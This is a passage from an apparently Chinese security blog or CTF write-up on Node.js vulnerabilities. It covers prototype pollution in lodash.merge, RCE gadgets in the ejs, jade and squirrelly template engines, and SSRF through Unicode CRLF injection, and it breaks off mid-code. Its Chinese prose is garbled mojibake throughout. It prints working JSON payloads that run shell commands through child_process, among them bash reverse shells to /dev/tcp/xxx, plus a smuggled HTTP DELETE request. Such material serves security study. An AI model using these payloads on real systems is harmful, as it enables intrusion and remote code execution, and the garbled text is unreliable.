æˆäº† ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“ï¼Œæ‰€ä»¥åŸå‹é“¾æ±¡æŸ“ç®€å•æ¥è¯´å°±æ˜¯å¦‚æœèƒ½å¤Ÿæ§åˆ¶å¹¶ä¿®æ”¹ä¸€ä¸ªå¯¹è±¡çš„åŸå‹ï¼Œå°±å¯ä»¥å½±å“åˆ°æ‰€æœ‰å’Œè¿™ä¸ªå¯¹è±¡åŒä¸€ä¸ªåŸå‹çš„å¯¹è±¡ã€‚</p><h2 id="mergeæ“ä½œå¯¼è‡´åŸå‹é“¾æ±¡æŸ“"><a href="#mergeæ“ä½œå¯¼è‡´åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="mergeæ“ä½œå¯¼è‡´åŸå‹é“¾æ±¡æŸ“"></a>mergeæ“ä½œå¯¼è‡´åŸå‹é“¾æ±¡æŸ“</h2><p>mergeæ“ä½œæ˜¯æœ€å¸¸è§å¯èƒ½æ§åˆ¶é”®åçš„æ“ä½œï¼Œä¹Ÿæœ€èƒ½è¢«åŸå‹é“¾æ”»å‡»ã€‚<br>ä¾‹å­:</p><pre><code class="javascript">function merge(target, source) &#123;for (let key in source) &#123;    if (key in source &amp;&amp; key in target) &#123;        merge(target[key], source[key])    &#125; else &#123;        target[key] = source[key]        &#125;    &#125;&#125;let object1 = &#123;&#125;let object2 = JSON.parse(&#39;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#39;)merge(object1, object2)console.log(object1.a, object1.b)object3 = &#123;&#125;console.log(object3.b)# merge() å‡½æ•°ç”¨äºåˆå¹¶ä¸¤ä¸ªæ•°ç»„å†…å®¹åˆ°ç¬¬ä¸€ä¸ªæ•°ç»„ã€‚åœ¨æœ¬æ®µä»£ç çš„ä½œç”¨å°±æ˜¯å°†å¾…æ“ä½œçš„å¯¹è±¡mergeåˆ°ä¸€ä¸ªç©ºå¯¹è±¡ä¸­</code></pre><p>éœ€è¦æ³¨æ„çš„ç‚¹æ˜¯ï¼š<br>åœ¨JSONè§£æçš„æƒ…å†µä¸‹ï¼Œ__proto__ä¼šè¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªçœŸæ­£çš„â€œé”®åâ€ï¼Œè€Œä¸ä»£è¡¨â€œåŸå‹â€ï¼Œæ‰€ä»¥åœ¨éå†object2çš„æ—¶å€™ä¼šå­˜åœ¨è¿™ä¸ªé”®ã€‚<br>æˆ‘ä»¬æ¥çœ‹ä¸‹ï¼Œæœ‰å’Œæ²¡æœ‰JSONè§£æçš„åŒºåˆ«</p><pre><code class="javascript">&lt;script&gt;          let o2 = &#123;a:1,&quot;__proto__&quot;:&#123;b:2&#125;&#125;        console.log(o2)      let object2=JSON.parse(&#39;&#123;&quot;a&quot;:1,&quot;__proto__&quot;:&#123;&quot;b&quot;:2&#125;&#125;&#39;)      console.log(object2)  &lt;/script&gt;</code></pre><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668836886258-58f08cf3-4739-40b1-ade0-6f1a54f8dc7f.png" alt="image-20220416001143881.png"><br> æ‰€ä»¥ä»£ç åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ä¼šå­˜åœ¨è¿™ä¹ˆä¸€æ­¥  </p><pre><code class="javascript">target[__proto__]=source[__proto__]å¯ç†è§£ä¸º  object.prototype = &#123;&quot;b&quot;: 2&#125; å¯¼è‡´äº†åŸå‹é“¾æ±¡æŸ“</code></pre><p> æœ€ç»ˆè¾“å‡ºçš„ç»“æœä¸ºï¼š<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668839912381-24bdf37b-f5df-41ea-a963-e5c31549da5d.png" alt="image.png"><br> å¯è§object3çš„bæ˜¯ä»åŸå‹ä¸­è·å–åˆ°çš„ï¼Œè¯´æ˜Objectå·²ç»è¢«æ±¡æŸ“äº†ã€‚  </p><h2 id="lodash"><a href="#lodash" class="headerlink" title="lodash"></a>lodash</h2><blockquote><p> lodashæ˜¯ä¸ºäº†å¼¥è¡¥JavaScriptåŸç”Ÿå‡½æ•°åŠŸèƒ½ä¸è¶³è€Œæä¾›çš„ä¸€ä¸ªè¾…åŠ©åŠŸèƒ½é›†ï¼Œå…¶ä¸­åŒ…å«å­—ç¬¦ä¸²ã€æ•°ç»„ã€å¯¹è±¡ç­‰æ“ä½œã€‚è¿™ä¸ªWebåº”ç”¨ä¸­ï¼Œä½¿ç”¨äº†lodashæä¾›çš„ä¸¤ä¸ªå·¥å…·ï¼š  </p><ol><li>lodash.template ä¸€ä¸ªç®€å•çš„æ¨¡æ¿å¼•æ“</li><li>lodash.merge å‡½æ•°æˆ–å¯¹è±¡çš„åˆå¹¶</li></ol><p> å…¶å®æ•´ä¸ªåº”ç”¨é€»è¾‘å¾ˆç®€å•ï¼Œç”¨æˆ·æäº¤çš„ä¿¡æ¯ï¼Œç”¨mergeæ–¹æ³•åˆå¹¶åˆ°sessioné‡Œï¼Œå¤šæ¬¡æäº¤ï¼Œsessioné‡Œæœ€ç»ˆä¿å­˜ä½ æäº¤çš„æ‰€æœ‰ä¿¡æ¯ã€‚</p></blockquote><p>ä»¥<a href="https://github.com/phith0n/code-breaking/blob/master/2018/thejs/web/server.js">Code-Breaking 2018 Thejs</a>ä¸ºä¾‹è¯´æ˜åˆ†æè¿‡ç¨‹:<br> é¢˜ç›®æºç ä¸‹è½½ï¼š<a href="http://code-breaking.com/puzzle/9/">http://code-breaking.com/puzzle/9/</a></p><pre><code class="javascript">const fs = require(&#39;fs&#39;)const express = require(&#39;express&#39;)const bodyParser = require(&#39;body-parser&#39;)const lodash = require(&#39;lodash&#39;)const session = require(&#39;express-session&#39;)const randomize = require(&#39;randomatic&#39;)const app = express()app.use(bodyParser.urlencoded(&#123;extended: true&#125;)).use(bodyParser.json())app.use(&#39;/static&#39;, express.static(&#39;static&#39;))app.use(session(&#123;    name: &#39;thejs.session&#39;,    secret: randomize(&#39;aA0&#39;, 16),    resave: false,    saveUninitialized: false&#125;))app.engine(&#39;ejs&#39;, function (filePath, options, callback) &#123; // define the template engine    fs.readFile(filePath, (err, content) =&gt; &#123;        if (err) return callback(new Error(err))        let compiled = lodash.template(content)        let rendered = compiled(&#123;...options&#125;)        return callback(null, rendered)    &#125;)&#125;)app.set(&#39;views&#39;, &#39;./views&#39;)app.set(&#39;view engine&#39;, &#39;ejs&#39;)app.all(&#39;/&#39;, (req, res) =&gt; &#123;    let data = req.session.data || &#123;language: [], category: []&#125;    if (req.method == &#39;POST&#39;) &#123;        data = lodash.merge(data, req.body)        req.session.data = data    &#125;        res.render(&#39;index&#39;, &#123;        language: data.language,         category: data.category    &#125;)&#125;)app.listen(3000, () =&gt; console.log(`Example app listening on port 3000!`))</code></pre><p> é—®é¢˜å‡ºåœ¨lodash.merge()å‡½æ•°,è¿™ä¸ªå‡½æ•°å­˜åœ¨åŸå‹é“¾æ±¡æŸ“æ¼æ´ã€‚æˆ‘ä»¬å¾—å¯»æ‰¾åˆ°å¯ä»¥åˆ©ç”¨çš„ç‚¹ã€‚å› ä¸ºé€šè¿‡æ¼æ´å¯ä»¥æ§åˆ¶æŸä¸€ç§å®ä¾‹å¯¹è±¡åŸå‹çš„å±æ€§ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å»å¯»æ‰¾ä¸€ä¸ªå¯ä»¥è¢«åˆ©ç”¨çš„å±æ€§ã€‚<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668840471628-b5711487-8536-4a31-b5b4-c779de7628db.png" alt="image-20220416004841823.png"><br> é¡µé¢æœ€ç»ˆä¼šé€šè¿‡lodash.templateè¿›è¡Œæ¸²æŸ“<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668840499521-d6d64285-7a69-4e69-b6fb-a8221e5ff74f.png" alt="image-20220416005502144.png"><br> è·Ÿè¸ªåˆ°lodash/template.jsä¸­<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668840571097-a32cb4ca-8bf1-44a2-b1ff-940d5d715282.png" alt="QyN5JVOde3YL8aZ.png"><br>å¦‚å›¾å¯ä»¥çœ‹åˆ°optionsæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼ŒsourceURLæ˜¯é€šè¿‡ä¸‹é¢çš„è¯­å¥èµ‹å€¼çš„ï¼Œoptionsé»˜è®¤æ²¡æœ‰sourceURLå±æ€§ï¼Œæ‰€ä»¥sourceURLé»˜è®¤ä¹Ÿæ˜¯ä¸ºç©ºã€‚å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿç»™optionsçš„åŸå‹å¯¹è±¡åŠ ä¸€ä¸ªsourceURLå±æ€§ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶sourceURLçš„å€¼ã€‚<br>ç»§ç»­å¾€ä¸‹é¢çœ‹ï¼Œæœ€åsourceURLä¼ é€’åˆ°äº†Functionå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°å½“ä¸­ï¼š<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668840627165-a79efcc5-3819-4e3f-8a7d-a2accd1ef055.png" alt="pwoVFrOyfzJX42M.png"><br>é€šè¿‡æ„é€ chile_process.exec()å°±å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç äº†ã€‚<br>æœ€ç»ˆå¯ä»¥æ„é€ ä¸€ä¸ªç®€å•çš„Payloadä½œä¸ºä¼ é€’ç»™ä¸»é¡µé¢çš„çš„POSTæ•°æ®(windowsè°ƒç”¨è®¡ç®—å™¨)ï¼š</p><pre><code class="javascript">&#123;&quot;__proto__&quot;:&#123;&quot;sourceURL&quot;:&quot;\nglobal.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;calc&#39;)//&quot;&#125;&#125;</code></pre><p>(è¿™é‡Œç›´æ¥ç”¨requireä¼šæŠ¥é”™ï¼šReferenceError: require is not defined<br>pç¥ç»™äº†ä¸€ä¸ªæ›´å¥½çš„payloadï¼š</p><pre><code class="javascript">&#123;&quot;__proto__&quot;:&#123;&quot;sourceURL&quot;:&quot;\nreturn e=&gt; &#123;for (var a in &#123;&#125;) &#123;delete Object.prototype[a];&#125; return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;id&#39;)&#125;\n//&quot;&#125;&#125;</code></pre><h2 id="ejs"><a href="#ejs" class="headerlink" title="ejs"></a>ejs</h2><blockquote><p>ä¸»è¦ä¸ºä¸¤ä¸ªå‡½æ•°çš„ä¼ªé€ ã€‚<br>opts.outputFunctionName<br>opts.escapeFunction</p></blockquote><p><strong>ä¾‹ä¸€</strong><br> test.js  </p><pre><code class="javascript">var express = require(&#39;express&#39;);var _= require(&#39;lodash&#39;);var ejs = require(&#39;ejs&#39;);var app = express();//è®¾ç½®æ¨¡æ¿çš„ä½ç½®app.set(&#39;views&#39;, __dirname);//å¯¹åŸå‹è¿›è¡Œæ±¡æŸ“var malicious_payload = &#39;&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(\&#39;child_process\&#39;).exec(\&#39;calc\&#39;);var __tmp2&quot;&#125;&#125;&#39;;_.merge(&#123;&#125;, JSON.parse(malicious_payload));//è¿›è¡Œæ¸²æŸ“app.get(&#39;/&#39;, function (req, res) &#123;    res.render (&quot;./test.ejs&quot;,&#123;        message: &#39;lufei test &#39;    &#125;);&#125;);//è®¾ç½®httpvar server = app.listen(8081, function () &#123;    var host = server.address().address    var port = server.address().port    console.log(&quot;åº”ç”¨å®ä¾‹ï¼Œè®¿é—®åœ°å€ä¸º http://%s:%s&quot;, host, port)&#125;);</code></pre><p> test.ejs  </p><pre><code class="javascript">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;meta charset=&quot;utf-8&quot;&gt;    &lt;title&gt;&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;&lt;%= message%&gt;&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p> payloadï¼š  </p><pre><code class="javascript">&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/6666 0&gt;&amp;1\&quot;&#39;);var __tmp2&quot;&#125;&#125;</code></pre><pre><code class="javascript">&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(\&#39;child_process\&#39;).exec(\&#39;calc\&#39;);var __tmp2&quot;&#125;&#125;</code></pre><p><strong>ä¾‹äºŒ</strong></p><pre><code class="javascript">router.post(&#39;/&#39;, require(&#39;body-parser&#39;).json(),function(req, res, next) &#123;  res.type(&#39;html&#39;);  var user = new function()&#123;    this.userinfo = new function()&#123;    this.isVIP = false;    this.isAdmin = false;        &#125;;  &#125;;  utils.copy(user.userinfo,req.body);  if(user.userinfo.isAdmin)&#123;    return res.json(&#123;ret_code: 0, ret_msg: &#39;login success!&#39;&#125;);    &#125;else&#123;    return res.json(&#123;ret_code: 2, ret_msg: &#39;login fail!&#39;&#125;);    &#125;&#125;);</code></pre><p>**<em>payload1</em>**ï¼šè¦†ç›– opts.outputFunctionName , è¿™æ ·æ„é€ çš„payloadå°±ä¼šè¢«æ‹¼æ¥è¿›jsè¯­å¥ä¸­ï¼Œå¹¶åœ¨ ejs æ¸²æŸ“æ—¶è¿›è¡Œ RCEã€‚  </p><pre><code class="javascript">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a=1; return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;dir&#39;); //&quot;&#125;&#125;&#125;&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;__tmp1; return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;dir&#39;); __tmp2&quot;&#125;&#125;&#125;</code></pre><p>**<em>payload2</em>**ï¼šä¼ªé€  opts.escapeFunction ä¹Ÿå¯ä»¥è¿›è¡Œ RCE  </p><pre><code class="javascript">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;client&quot;:true,&quot;escapeFunction&quot;:&quot;1; return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;dir&#39;);&quot;&#125;&#125;&#125;</code></pre><p><strong>è¡¥å……:</strong> åœ¨ ejs æ¨¡æ¿ä¸­è¿˜æœ‰ä¸‰ä¸ªå¯æ§çš„å‚æ•°, åˆ†åˆ«ä¸º opts.localsName å’Œ opts.destructuredLocals å’Œ opts.filename, ä½†æ˜¯è¿™ä¸‰ä¸ªæ— æ³•æ„å»ºå‡ºåˆé€‚çš„æ±¡æŸ“é“¾ã€‚  </p><h2 id="jade"><a href="#jade" class="headerlink" title="jade"></a>jade</h2><p>compileDebugçš„ä¼ªé€ <br>ç»™å‡ºä¸Šé¢é¢˜ç›®çš„payloadï¼Œå¯å‚è€ƒç€çœ‹ã€‚</p><pre><code class="javascript">&#123;&quot;__proto__&quot;:&#123;&quot;compileDebug&quot;:1,&quot;self&quot;:1,&quot;line&quot;:&quot;console.log(global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/1234 0&gt;&amp;1\&quot;&#39;))&quot;&#125;&#125;</code></pre><pre><code class="javascript">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;: &#123;&quot;type&quot;:&quot;Code&quot;,&quot;compileDebug&quot;:true,&quot;self&quot;:true,&quot;line&quot;:&quot;0, \&quot;\&quot; ));return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;dir&#39;);//&quot;&#125;&#125;&#125;</code></pre><h2 id="squirrelly"><a href="#squirrelly" class="headerlink" title="squirrelly"></a>squirrelly</h2><p><strong><em>CVE-2021-32819</em></strong><br>server.js</p><pre><code class="javascript">const express = require(&#39;express&#39;)const squirrelly = require(&#39;squirrelly&#39;)const app = express()app.set(&#39;views&#39;, __dirname);app.set(&#39;view engine&#39;, &#39;squirrelly&#39;)app.use(express.urlencoded(&#123; extended: false &#125;));app.get(&#39;/&#39;, (req, res) =&gt; &#123;   res.render(&#39;index.squirrelly&#39;, req.query)&#125;)var server = app.listen(3000, &#39;0.0.0.0&#39;, function () &#123;    var host = server.address().address    var port = server.address().port    console.log(&quot;Listening on http://%s:%s&quot;, host, port)&#125;);</code></pre><p> index.squirrelly  </p><pre><code class="javascript">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;title&gt;CVE-2021-32819&lt;/title&gt;        &lt;h1&gt;Test For CVE-2021-32819&lt;/h1&gt;    &lt;/head&gt;&lt;body&gt;    &lt;h1&gt;&#123;&#123;it.variable&#125;&#125;&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p> payload  </p><pre><code class="javascript">/?defaultFilter=e&#39;)); let require = global.require || global.process.mainModule.constructor._load; require(&#39;child_process&#39;).exec(&#39;dir&#39;); //</code></pre><p>PS:ä»¥ä¸‹è´´å‡ºå‡ ç¯‡æ–‡ç« ï¼Œå¸ˆå‚…ä»¬å¯ä»¥è·Ÿè¿›åˆ†æï¼š<br><a href="https://www.aisoutu.com/a/1373814">https://www.aisoutu.com/a/1373814</a><br><a href="https://cloud.tencent.com/developer/article/2035888">https://cloud.tencent.com/developer/article/2035888</a><br><a href="https://www.freebuf.com/vuls/276112.html">https://www.freebuf.com/vuls/276112.html</a><br><a href="https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/">å‡ ä¸ªnodeæ¨¡æ¿å¼•æ“çš„åŸå‹é“¾æ±¡æŸ“åˆ†æ</a></p><h1 id="nodejsä¸­çš„ssrf"><a href="#nodejsä¸­çš„ssrf" class="headerlink" title="nodejsä¸­çš„ssrf"></a>nodejsä¸­çš„ssrf</h1><h2 id="åŸç†-1"><a href="#åŸç†-1" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>**è™½ç„¶ç”¨æˆ·å‘å‡ºçš„httpè¯·æ±‚é€šå¸¸å°†è¯·æ±‚è·¯å¾„æŒ‡å®šä¸ºå­—ç¬¦ä¸²ï¼Œä½†Node.jsæœ€ç»ˆå¿…é¡»å°†è¯·æ±‚ä½œä¸ºåŸå§‹å­—èŠ‚è¾“å‡ºã€‚JavaScriptæ”¯æŒunicodeå­—ç¬¦ä¸²ï¼Œå› æ­¤å°†å®ƒä»¬è½¬æ¢ä¸ºå­—èŠ‚æ„å‘³ç€é€‰æ‹©å¹¶åº”ç”¨é€‚å½“çš„unicodeç¼–ç ã€‚å¯¹äºä¸åŒ…å«ä¸»ä½“çš„è¯·æ±‚ï¼ŒNode.jsé»˜è®¤ä½¿ç”¨â€œlatin1â€ï¼Œè¿™æ˜¯ä¸€ç§å•å­—èŠ‚ç¼–ç ï¼Œä¸èƒ½è¡¨ç¤ºé«˜ç¼–å·çš„unicodeå­—ç¬¦ã€‚ç›¸åï¼Œè¿™äº›å­—ç¬¦è¢«æˆªæ–­ä¸ºå…¶JavaScriptè¡¨ç¤ºçš„æœ€ä½å­—èŠ‚  **</p><pre><code class="plsql">&gt; v = &quot;/caf\u&#123;E9&#125;\u&#123;01F436&#125;&quot;&#39;/cafÃ©ğŸ¶&#39;&gt; Buffer.from(v,&#39;latin1&#39;).toString(&#39;latin1&#39;)&#39;/cafÃ©=6&#39;</code></pre><p><strong>Crlf HTTPå¤´æ³¨å…¥:</strong><br> å‡è®¾ä¸€ä¸ªæœåŠ¡å™¨ï¼Œæ¥å—ç”¨æˆ·è¾“å…¥ï¼Œå¹¶å°†å…¶åŒ…å«åœ¨é€šè¿‡HTTPå…¬å¼€çš„å†…éƒ¨æœåŠ¡è¯·æ±‚ä¸­ï¼Œåƒè¿™æ ·ï¼š  </p><pre><code class="plsql">GET /private-api?q=&lt;user-input-here&gt; HTTP/1.1Authorization: server-secret-key</code></pre><p> å¦‚æœæœåŠ¡å™¨æœªæ­£ç¡®éªŒè¯ç”¨æˆ·è¾“å…¥ï¼Œåˆ™æ”»å‡»è€…å¯èƒ½ä¼šç›´æ¥æ³¨å…¥åè®®æ§åˆ¶å­—ç¬¦åˆ°è¯·æ±‚é‡Œã€‚å‡è®¾åœ¨è¿™ç§æƒ…å†µä¸‹æœåŠ¡å™¨æ¥å—äº†ä»¥ä¸‹ç”¨æˆ·è¾“å…¥ï¼š  </p><pre><code class="plsql">&quot;x HTTP/1.1\r\n\r\nDELETE /private-api HTTP/1.1\r\n&quot;</code></pre><p> åœ¨å‘å‡ºè¯·æ±‚æ—¶ï¼ŒæœåŠ¡å™¨å¯èƒ½ä¼šç›´æ¥å°†å…¶å†™å…¥è·¯å¾„ï¼Œå¦‚ä¸‹ï¼š  </p><pre><code class="plsql">GET /private-api?q=x HTTP/1.1DELETE /private-apiAuthorization: server-secret-key</code></pre><p><strong>è¯´åˆ°åº•å°±æ˜¯\r\næˆåŠŸç”Ÿæ•ˆ</strong><br>æ¥æ”¶æœåŠ¡å°†æ­¤è§£é‡Šä¸ºä¸¤ä¸ªå•ç‹¬çš„HTTPè¯·æ±‚ï¼Œä¸€ä¸ªGETåè·Ÿä¸€ä¸ªDELETE<br>å¥½çš„HTTPåº“é€šé€šå¸¸åŒ…å«é˜»æ­¢è¿™ä¸€è¡Œä¸ºçš„æªæ–½ï¼ŒNode.jsä¹Ÿä¸ä¾‹å¤–ï¼šå¦‚æœä½ å°è¯•å‘å‡ºä¸€ä¸ªè·¯å¾„ä¸­å«æœ‰æ§åˆ¶å­—ç¬¦çš„HTTPè¯·æ±‚ï¼Œå®ƒä»¬ä¼šè¢«URLç¼–ç ï¼š</p><pre><code class="plsql">http.get(&#39;http://example.com/\r\n/test&#39;).output[ &#39;GET /%0D%0A/test HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n&#39; ]</code></pre><p> ä¸å¹¸çš„æ˜¯ï¼Œä¸Šè¿°çš„å¤„ç†unicodeå­—ç¬¦é”™è¯¯æ„å‘³ç€å¯ä»¥è§„é¿è¿™äº›æªæ–½ã€‚è€ƒè™‘å¦‚ä¸‹çš„URLï¼Œå…¶ä¸­åŒ…å«ä¸€äº›å¸¦å˜éŸ³ç¬¦å·çš„unicodeå­—ç¬¦ï¼š  </p><pre><code class="plsql">&#39;http://example.com/\u&#123;010D&#125;\u&#123;010A&#125;/test&#39;http://example.com/ÄÄŠ/test</code></pre><p> å½“Node.jsç‰ˆæœ¬8æˆ–æ›´ä½ç‰ˆæœ¬å¯¹æ­¤URLå‘å‡ºGETè¯·æ±‚æ—¶ï¼Œå®ƒä¸ä¼šè¿›è¡Œè½¬ä¹‰ï¼Œå› ä¸ºå®ƒä»¬ä¸æ˜¯HTTPæ§åˆ¶å­—ç¬¦ï¼š  </p><pre><code class="plsql">http.get(&#39;http://example.com/\u010D\u010A/test&#39;).output[ &#39;GET /ÄÄŠ/test HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n&#39; ]</code></pre><p> ä½†æ˜¯å½“ç»“æœå­—ç¬¦ä¸²è¢«ç¼–ç ä¸ºlatin1å†™å…¥è·¯å¾„æ—¶ï¼Œè¿™äº›å­—ç¬¦å°†åˆ†åˆ«è¢«æˆªæ–­ä¸ºâ€œ\râ€å’Œâ€œ\nâ€ï¼š  </p><pre><code class="plsql">Buffer.from(&#39;http://example.com/\u&#123;010D&#125;\u&#123;010A&#125;/test&#39;, &#39;latin1&#39;).toString()&#39;http://example.com/\r\n/test&#39;</code></pre><p>Node.jsé»˜è®¤ä½¿ç”¨â€œlatin1â€ï¼Œè¿™æ˜¯ä¸€ç§å•å­—èŠ‚ç¼–ç ï¼Œä¸èƒ½è¡¨ç¤ºé«˜ç¼–å·çš„unicodeå­—ç¬¦<br>è¯´ç™½äº†ï¼Œä¸Šé¢è¿™æ®µçš„æ„æ€å°±æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¸€äº›ç‰¹æ®Šå­—ç¬¦ï¼Œå®ƒä»¬åœ¨URLè¯·æ±‚æ—¶ä¸ä¼šè¢«è½¬ä¹‰å¤„ç†ï¼Œä½†æ˜¯å½“å®ƒåˆ°äº†jså¼•æ“æ—¶ï¼Œç”±äºå…¶é»˜è®¤ç”¨çš„æ˜¯latin1ï¼Œå› æ­¤å¯ä»¥å°†æˆ‘ä»¬ç”¨çš„ç‰¹æ®Šå­—ç¬¦è½¬ä¹‰å¾—åˆ°æˆ‘ä»¬éœ€è¦çš„å­—ç¬¦ï¼Œä»è€Œè¾¾åˆ°ssrfçš„ç›®çš„</p><h2 id="GYCTF2020-Node-Game"><a href="#GYCTF2020-Node-Game" class="headerlink" title="[GYCTF2020]Node Game"></a>[GYCTF2020]Node Game</h2><p><strong>sourceï¼š</strong></p><pre><code class="plsql">var express = require(&#39;express&#39;); var app = express(); var fs = require(&#39;fs&#39;); var path = require(&#39;path&#39;); // å¤„ç†æ–‡ä»¶è·¯å¾„ var http = require(&#39;http&#39;); var pug = require(`pug`); // æ¨¡æ¿æ¸²æŸ“ var morgan = require(&#39;morgan&#39;); // æ—¥å¿— const multer = require(&#39;multer&#39;); // ç”¨äºå¤„ç†multipart/form-dataç±»å‹çš„è¡¨å•æ•°æ®ï¼Œå®ç°ä¸Šä¼ åŠŸèƒ½// å°†ä¸Šä¼ çš„æ–‡ä»¶å­˜å‚¨åœ¨./dist[è‡ªåŠ¨åˆ›å»º]è¿”å›ä¸€ä¸ªåä¸ºfileçš„æ–‡ä»¶æ•°ç»„ app.use(multer(&#123;dest: &#39;./dist&#39;&#125;).array(&#39;file&#39;)); // ä½¿ç”¨ç®€åŒ–ç‰ˆæ—¥å¿— app.use(morgan(&#39;short&#39;));  // é™æ€æ–‡ä»¶è·¯ç”± app.use(&quot;/uploads&quot;, express.static(path.join(__dirname, &#39;/uploads&#39;))) app.use(&quot;/template&quot;, express.static(path.join(__dirname, &#39;/template&#39;)))  app.get(&#39;/&#39;, function (req, res) &#123;      // GETæ–¹æ³•è·å–actionå‚æ•°      var action = req.query.action ? req.query.action : &quot;index&quot;;      // actionä¸­ä¸èƒ½åŒ…å«/ &amp; \      if (action.includes(&quot;/&quot;) || action.includes(&quot;\\&quot;)) &#123;            res.send(&quot;Errrrr, You have been Blocked&quot;);      &#125;        // å°†/template/[action].pugæ¸²æŸ“æˆhtmlè¾“å‡ºåˆ°æ ¹ç›®å½•      file = path.join(__dirname + &#39;/template/&#39; + action + &#39;.pug&#39;);      var html = pug.renderFile(file);      res.send(html); &#125;);  app.post(&#39;/file_upload&#39;, function (req, res) &#123;      var ip = req.connection.remoteAddress; // remoteAddressæ— æ³•ä¼ªé€ ï¼Œå› ä¸ºTCPæœ‰ä¸‰æ¬¡æ¡æ‰‹ï¼Œä¼ªé€ æºIPä¼šå¯¼è‡´æ— æ³•å®ŒæˆTCPè¿æ¥      var obj = &#123;msg: &#39;&#39;,&#125;      // è¯·æ±‚å¿…é¡»æ¥è‡ªlocalhost      if (!ip.includes(&#39;127.0.0.1&#39;)) &#123;            obj.msg = &quot;only admin&#39;s ip can use it&quot;            res.send(JSON.stringify(obj));            return      &#125;      fs.readFile(req.files[0].path, function (err, data) &#123;            if (err) &#123;                  obj.msg = &#39;upload failed&#39;;                  res.send(JSON.stringify(obj));            &#125; else &#123;                  // æ–‡ä»¶è·¯å¾„ä¸º/uploads/[mimetype]/filenameï¼Œmimetypeå¯ä»¥è¿›è¡Œç›®å½•ç©¿è¶Šå®ç°å°†æ–‡ä»¶å­˜å‚¨è‡³/templateå¹¶åˆ©ç”¨actionæ¸²æŸ“åˆ°ç•Œé¢                  var file_path = &#39;/uploads/&#39; + req.files[0].mimetype + &quot;/&quot;;                  var file_name = req.files[0].originalname                  var dir_file = __dirname + file_path + file_name                  if (!fs.existsSync(__dirname + file_path)) &#123;                        try &#123;                              fs.mkdirSync(__dirname + file_path)                        &#125; catch (error) &#123;                              obj.msg = &quot;file type error&quot;;                              res.send(JSON.stringify(obj));                              return                        &#125;                  &#125;                  try &#123;                        fs.writeFileSync(dir_file, data)                        obj = &#123;msg: &#39;upload success&#39;, filename: file_path + file_name&#125;                  &#125; catch (error) &#123;                        obj.msg = &#39;upload failed&#39;;                  &#125;                  res.send(JSON.stringify(obj));            &#125;      &#125;) &#125;)  // æŸ¥çœ‹é¢˜ç›®æºç  app.get(&#39;/source&#39;, function (req, res) &#123;      res.sendFile(path.join(__dirname + &#39;/template/source.txt&#39;)); &#125;);  app.get(&#39;/core&#39;, function (req, res) &#123;      var q = req.query.q;      var resp = &quot;&quot;;      if (q) &#123;            var url = &#39;http://localhost:8081/source?&#39; + q            console.log(url)               // å¯¹urlå­—ç¬¦è¿›è¡Œwaf            var trigger = blacklist(url);            if (trigger === true) &#123;                  res.send(&quot;error occurs!&quot;);            &#125; else &#123;                  try &#123;                              // nodeå¯¹/sourceå‘å‡ºè¯·æ±‚ï¼Œæ­¤å¤„å¯ä»¥åˆ©ç”¨å­—ç¬¦ç 